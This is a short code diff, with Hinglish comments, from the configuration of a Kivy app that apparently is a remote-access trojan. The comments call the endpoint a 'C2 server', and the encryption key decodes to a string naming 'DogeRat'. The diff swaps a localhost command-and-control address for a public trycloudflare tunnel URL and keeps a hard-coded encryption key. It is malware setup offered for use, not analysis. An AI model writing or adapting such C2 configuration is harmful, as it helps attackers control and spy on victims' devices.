@@ -22,7 +22,7 @@ from kivy.animation import Animation
 
 # --- CONFIGURATION ---
 # Apna C2 Server IP/URL yahan daalo
-C2_URL = "ws://127.0.0.1:8080" 
+C2_URL = "https://design-bills-hose-shut.trycloudflare.com" 
 # Fernet key 32 bytes (url-safe base64) honi chahiye
 # Ye ek valid demo key hai, apni fixed key use karna
 ENCRYPTION_KEY = b"dGhpc0lzQVNlY3VyZUtleUZvckRvZ2VSYXRKYXZhQXBwMQ==" 
